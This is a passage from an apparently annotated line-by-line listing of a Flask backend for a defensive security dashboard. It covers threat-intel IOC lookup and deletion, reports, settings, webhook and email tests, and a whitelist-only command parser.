| 1884 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的哈希"}), 400` |
| 1885 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "cve" and not _is_valid_cve(canon):` |
| 1886 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 CVE"}), 400` |
| 1887 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1888 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.collectors.ioc_repository import IOCRepository` |
| 1889 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 1890 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1891 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        repo = IOCRepository(db.session)` |
| 1892 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        removed_db = repo.delete(ioc_type, canon)` |
| 1893 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 1894 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti: ThreatIntelCollector = app.extensions["guardian_threat_intel"]` |
| 1895 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "ip":` |
| 1896 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ti.remove_ip_from_blacklist(canon)` |
| 1897 | 条件分支：前面条件不满足时继续判断。 | `        elif ioc_type == "domain":` |
| 1898 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ti.remove_domain_from_blacklist(canon)` |
| 1899 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 1900 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ti.refresh_local_from_db()` |
| 1901 | 条件判断：满足条件时进入对应分支。 | `        if not removed_db:` |
| 1902 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "IOC 不存在"}), 404` |
| 1903 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "type": ioc_type, "value": canon}), 200` |
| 1904 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1905 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/threat_intel/query", methods=["POST"])` |
| 1906 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1907 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("30 per minute")` |
| 1908 | 函数定义：声明 `api_threat_intel_query` 的输入、处理逻辑和返回结果。 | `    def api_threat_intel_query():  # type: ignore[unused-function]` |
| 1909 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 1910 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ioc_type = str(payload.get("type", "")).strip()` |
| 1911 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        value = str(payload.get("value", "")).strip()` |
| 1912 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        providers_raw = payload.get("providers")` |
| 1913 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type not in IOC_TYPES:` |
| 1914 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": f"type 必须是 {list(IOC_TYPES)}"}), 400` |
| 1915 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        canon = _canonical_ioc_value(ioc_type, value)` |
| 1916 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "ip" and not validate_ip(canon):` |
| 1917 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 IP 地址"}), 400` |
| 1918 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "domain" and not _is_valid_domain(canon):` |
| 1919 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的域名"}), 400` |
| 1920 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "url" and not _is_valid_url(canon):` |
| 1921 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 URL"}), 400` |
| 1922 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "file_hash" and not _is_valid_file_hash(canon):` |
| 1923 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的哈希"}), 400` |
| 1924 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "cve" and not _is_valid_cve(canon):` |
| 1925 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 CVE"}), 400` |
| 1926 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1927 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        providers: List[str] = (` |
| 1928 | 函数调用：执行已有函数/方法完成当前步骤。 | `            [str(p) for p in providers_raw]` |
| 1929 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(providers_raw, list) and providers_raw` |
| 1930 | 兜底分支：处理前面条件都不满足的情况。 | `            else list(_DEFAULT_PROVIDERS)` |
| 1931 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1932 | 循环：逐个处理集合或迭代器中的元素。 | `        for p in providers:` |
| 1933 | 条件判断：满足条件时进入对应分支。 | `            if p not in _DEFAULT_PROVIDERS:` |
| 1934 | 返回结果：把处理后的值交回调用方。 | `                return (` |
| 1935 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                    jsonify(` |
| 1936 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        {` |
| 1937 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            "error": f"provider 非法：{p}",` |
| 1938 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            "allowed": list(_DEFAULT_PROVIDERS),` |
| 1939 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        }` |
| 1940 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ),` |
| 1941 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    400,` |
| 1942 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 1943 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1944 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti: ThreatIntelCollector = app.extensions["guardian_threat_intel"]` |
| 1945 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results: Dict[str, Dict[str, Any]] = {}` |
| 1946 | 循环：逐个处理集合或迭代器中的元素。 | `        for provider in providers:` |
| 1947 | 条件判断：满足条件时进入对应分支。 | `            if provider == "local":` |
| 1948 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results["local"] = _threat_intel_local_lookup(app, state, ioc_type, canon)` |
| 1949 | 条件分支：前面条件不满足时继续判断。 | `            elif provider == "abuseipdb":` |
| 1950 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results["abuseipdb"] = _threat_intel_abuseipdb(ti, ioc_type, canon)` |
| 1951 | 条件分支：前面条件不满足时继续判断。 | `            elif provider == "virustotal":` |
| 1952 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results["virustotal"] = _threat_intel_virustotal(ti, ioc_type, canon)` |
| 1953 | 条件分支：前面条件不满足时继续判断。 | `            elif provider in ("spamhaus", "phishtank", "openphish", "nvd", "cnvd"):` |
| 1954 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                results[provider] = ti.query_provider(provider, ioc_type, canon)` |
| 1955 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1956 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        overall = _threat_intel_summarize(results)` |
| 1957 | 条件判断：满足条件时进入对应分支。 | `        if results.get("local", {}).get("hit"):` |
| 1958 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _incr_ioc_hit_db(ioc_type, canon)` |
| 1959 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1960 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 1961 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 1962 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "type": ioc_type,` |
| 1963 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "value": canon,` |
| 1964 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "results": results,` |
| 1965 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "overall": overall,` |
| 1966 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "evaluated_at": _now_iso(),` |
| 1967 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 1968 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 1969 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1970 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1971 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1972 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/threat_intel/_seed", methods=["POST"])` |
| 1973 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1974 | 函数定义：声明 `api_threat_intel_seed` 的输入、处理逻辑和返回结果。 | `    def api_threat_intel_seed():  # type: ignore[unused-function]` |
| 1975 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = get_config()` |
| 1976 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        allow = bool(getattr(cfg, "DEBUG", False)) or (` |
| 1977 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("ALLOW_DEV_SEED", "").lower() == "true"` |
| 1978 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1979 | 条件判断：满足条件时进入对应分支。 | `        if not allow:` |
| 1980 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "dev seed 在当前环境未启用"}), 403` |
| 1981 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        created = _seed_demo_iocs(app)` |
| 1982 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "created": created}), 201` |
| 1983 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1984 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/reports", methods=["GET"])` |
| 1985 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1986 | 函数定义：声明 `api_reports` 的输入、处理逻辑和返回结果。 | `    def api_reports():  # type: ignore[unused-function]` |
| 1987 | 文档字符串：说明当前模块、类或函数的职责。 | `        """返回可选的报告周期列表。Phase 7 先列出固定 period。"""` |
| 1988 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1989 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 1990 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 1991 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "available_periods": list(REPORT_PERIODS),` |
| 1992 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "default": "day",` |
| 1993 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 1994 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 1995 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1996 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1997 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1998 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/reports/summary", methods=["GET"])` |
| 1999 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 2000 | 函数定义：声明 `api_reports_summary` 的输入、处理逻辑和返回结果。 | `    def api_reports_summary():  # type: ignore[unused-function]` |
| 2001 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        period = request.args.get("period", "day").lower()` |
| 2002 | 条件判断：满足条件时进入对应分支。 | `        if period not in REPORT_PERIODS:` |
| 2003 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2004 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 2005 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 2006 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "error": f"period 必须是 {list(REPORT_PERIODS)}",` |
| 2007 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 2008 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 2009 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 2010 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2011 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        summary = _build_report_summary(app, period=period)` |
| 2012 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(summary), 200` |
| 2013 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2014 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/reports/export", methods=["GET"])` |
| 2015 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 2016 | 函数定义：声明 `api_reports_export` 的输入、处理逻辑和返回结果。 | `    def api_reports_export():  # type: ignore[unused-function]` |
| 2017 | 文档字符串：说明当前模块、类或函数的职责。 | `        """同 summary 数据源；\`\`format=html\`\` 返回可打印/另存为 PDF 的 HTML。"""` |
| 2018 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        period = request.args.get("period", "day").lower()` |
| 2019 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        fmt = (request.args.get("format") or "json").strip().lower()` |
| 2020 | 条件判断：满足条件时进入对应分支。 | `        if period not in REPORT_PERIODS:` |
| 2021 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2022 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify({"error": f"period 必须是 {list(REPORT_PERIODS)}"}),` |
| 2023 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 2024 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2025 | 条件判断：满足条件时进入对应分支。 | `        if fmt not in ("json", "html"):` |
| 2026 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2027 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 2028 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 2029 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "error": "format 必须是 json 或 html",` |
| 2030 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "note": "pdf 请使用 HTML + 浏览器打印为 PDF，或后续对接 headless 渲染。",` |
| 2031 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 2032 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 2033 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 2034 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2035 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        summary = _build_report_summary(app, period=period)` |
| 2036 | 条件判断：满足条件时进入对应分支。 | `        if fmt == "html":` |
| 2037 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            resp = render_template("report_export.html", summary=summary)` |
| 2038 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2039 | 代码语句：参与当前文件的业务流程或数据处理。 | `                resp,` |
| 2040 | 代码语句：参与当前文件的业务流程或数据处理。 | `                200,` |
| 2041 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 2042 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "Content-Type": "text/html; charset=utf-8",` |
| 2043 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "Content-Disposition": 'inline; filename="guardian-report.html"',` |
| 2044 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 2045 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2046 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(summary), 200` |
| 2047 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2048 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/settings", methods=["GET", "PUT"])` |
| 2049 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 2050 | 函数定义：声明 `api_settings` 的输入、处理逻辑和返回结果。 | `    def api_settings():  # type: ignore[unused-function]` |
| 2051 | 条件判断：满足条件时进入对应分支。 | `        if request.method == "GET":` |
| 2052 | 返回结果：把处理后的值交回调用方。 | `            return jsonify(_build_settings_snapshot(app)), 200` |
| 2053 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2054 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 2055 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(payload, dict):` |
| 2056 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "请求体必须是对象"}), 400` |
| 2057 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2058 | 函数调用：执行已有函数/方法完成当前步骤。 | `        normalized, errors = _validate_settings_payload(` |
| 2059 | 函数调用：执行已有函数/方法完成当前步骤。 | `            payload, existing=state.all_settings()` |
| 2060 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2061 | 条件判断：满足条件时进入对应分支。 | `        if errors:` |
| 2062 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2063 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 2064 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 2065 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "error": "部分字段校验未通过",` |
| 2066 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "errors": errors,` |
| 2067 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 2068 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 2069 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 2070 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2071 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2072 | 函数调用：执行已有函数/方法完成当前步骤。 | `        state.update_settings(normalized)` |
| 2073 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _persist_settings_to_db(normalized)` |
| 2074 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 2075 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "[Settings] 运行时配置更新: %s", list(normalized.keys())` |
| 2076 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2077 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        snapshot = _build_settings_snapshot(app)` |
| 2078 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        snapshot["status"] = "saved"` |
| 2079 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        snapshot["updated_keys"] = list(normalized.keys())` |
| 2080 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(snapshot), 200` |
| 2081 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2082 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/settings/test_webhook", methods=["POST"])` |
| 2083 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 2084 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("5 per minute")` |
| 2085 | 函数定义：声明 `api_settings_test_webhook` 的输入、处理逻辑和返回结果。 | `    def api_settings_test_webhook():  # type: ignore[unused-function]` |
| 2086 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 2087 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url = str(payload.get("url") or state.get_setting("alert_webhook") or "").strip()` |
| 2088 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        err = _validate_webhook_url(url)` |
| 2089 | 条件判断：满足条件时进入对应分支。 | `        if err:` |
| 2090 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"ok": False, "reason": err}), 400` |
| 2091 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2092 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import requests as _requests` |
| 2093 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2094 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 2095 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            resp = _requests.post(` |
| 2096 | 代码语句：参与当前文件的业务流程或数据处理。 | `                url,` |
| 2097 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                json={` |
| 2098 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "event": "ag_test_webhook",` |
| 2099 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source": "ai-security-guardian",` |
| 2100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "timestamp": _now_iso(),` |
| 2101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "message": "这是一次手动触发的 Webhook 联通性测试。",` |
| 2102 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 2103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timeout=5,` |
| 2104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                headers={"User-Agent": "AI-Security-Guardian/Phase7"},` |
| 2105 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2106 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2107 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 2108 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 2109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "ok": resp.status_code < 400,` |
| 2110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "status_code": resp.status_code,` |
| 2111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "latency_ms": int(resp.elapsed.total_seconds() * 1000),` |
| 2112 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 2113 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 2114 | 代码语句：参与当前文件的业务流程或数据处理。 | `                200,` |
| 2115 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2116 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except _requests.exceptions.Timeout:` |
| 2117 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"ok": False, "reason": "timeout"}), 200` |
| 2118 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except _requests.exceptions.RequestException as exc:` |
| 2119 | 注释：解释下面或当前这段代码的设计意图。 | `            # 不回显 URL 以免暴露敏感路径；只回显异常类型` |
| 2120 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2121 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 2122 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 2123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "ok": False,` |
| 2124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "reason": "request_error",` |
| 2125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "detail": type(exc).__name__,` |
| 2126 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 2127 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 2128 | 代码语句：参与当前文件的业务流程或数据处理。 | `                200,` |
| 2129 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2131 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/settings/test_email", methods=["POST"])` |
| 2132 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 2133 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("5 per minute")` |
| 2134 | 函数定义：声明 `api_settings_test_email` 的输入、处理逻辑和返回结果。 | `    def api_settings_test_email():  # type: ignore[unused-function]` |
| 2135 | 文档字符串：说明当前模块、类或函数的职责。 | `        """Phase 7 阶段仅校验邮箱格式；Phase 8 接入 SMTP 后改为真实投递。"""` |
| 2136 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 2137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        email = str(` |
| 2138 | 函数调用：执行已有函数/方法完成当前步骤。 | `            payload.get("email") or state.get_setting("alert_email") or ""` |
| 2139 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ).strip()` |
| 2140 | 条件判断：满足条件时进入对应分支。 | `        if not email:` |
| 2141 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"ok": False, "reason": "empty"}), 400` |
| 2142 | 条件判断：满足条件时进入对应分支。 | `        if not _EMAIL_RE.match(email):` |
| 2143 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"ok": False, "reason": "invalid_email_format"}), 400` |
| 2144 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 2145 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 2146 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 2147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "ok": True,` |
| 2148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "stubbed": True,` |
| 2149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "note": "邮件通道将在 Phase 8 接入 SMTP；当前仅做格式校验。",` |
| 2150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "would_send_to": email,` |
| 2151 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 2152 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 2153 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 2154 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2155 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2157 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2158 | 注释：解释下面或当前这段代码的设计意图。 | `# 命令面板：严格白名单 + 不拼接 shell` |
| 2159 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_COMMAND_PATTERN = re.compile(r"^(block\|unblock\|isolate\|rate-limit\|status)(?:\s+(\S+))?$")` |
| 2161 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2162 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2163 | 函数定义：声明 `_execute_safe_command` 的输入、处理逻辑和返回结果。 | `def _execute_safe_command(raw: str, state: _ServerState) -> Dict[str, Any]:` |
| 2164 | 文档字符串：说明当前模块、类或函数的职责。 | `    """对终端命令面板做白名单解析，绝不拼接到 shell。"""` |
| 2165 | 条件判断：满足条件时进入对应分支。 | `    if not raw:` |
| 2166 | 返回结果：把处理后的值交回调用方。 | `        return {"ok": False, "command": raw, "output": "命令为空"}` |
| 2167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    match = _COMMAND_PATTERN.match(raw)` |
| 2169 | 条件判断：满足条件时进入对应分支。 | `    if not match:` |
| 2170 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 2171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ok": False,` |
| 2172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "command": raw,` |
| 2173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "output": "命令不被允许。可用：block <ip> \| unblock <ip> \| isolate <ip> \| rate-limit <ip> \| status",` |
| 2174 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2176 | 函数调用：执行已有函数/方法完成当前步骤。 | `    action, arg = match.group(1), match.group(2) or ""` |
| 2177 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2178 | 条件判断：满足条件时进入对应分支。 | `    if action == "status":` |
| 2179 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _sync_banned_cache_from_db(state)` |
| 2180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        b_count = (` |
| 2181 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(func.count(BannedIp.ip)).scalar() or 0` |
| 2182 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t_count = db.session.query(func.count(Alert.id)).scalar() or 0` |
